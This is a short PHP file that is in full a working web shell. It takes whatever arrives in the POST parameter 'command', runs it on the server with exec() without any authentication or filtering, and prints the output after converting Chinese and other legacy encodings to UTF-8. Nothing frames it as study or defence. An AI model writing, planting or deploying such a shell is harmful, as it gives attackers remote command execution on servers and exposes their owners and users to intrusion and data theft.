<?php
    function strToUtf8($str){
        $encode = mb_detect_encoding($str, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5'));
        if($encode == 'UTF-8'){
            return $str;
        }else{
            return mb_convert_encoding($str, 'UTF-8', $encode);
        }
    }
    $result1 = exec((string)$_POST['command'],$result);
    echo strToUtf8($result1);
    $num = count($result); 
    for($i=0;$i<$num;++$i){ 
        if($result[$i] != $result1){
            echo strToUtf8($result[$i]); 
        }
    }
?>